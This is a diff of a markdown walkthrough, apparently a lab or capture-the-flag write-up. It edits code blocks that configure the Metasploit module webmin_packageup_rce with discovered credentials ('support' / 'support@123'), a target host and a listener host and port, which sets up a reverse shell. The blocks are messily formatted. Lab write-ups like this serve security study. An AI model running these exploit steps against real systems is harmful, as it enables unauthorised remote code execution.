@@ -335,14 +335,15 @@ use exploit/linux/http/webmin_packageup_rce
 
 We used the previously discovered credentials to configure the exploit.
 ```python
-msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 
-```
-
-```pytho
+> set USERNAME support msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD support@123 
 ```
 
 ```python
-msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
+> set lhost 172.16.250.62
+```
+
+```python
+> set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
 
 enabled SSL.
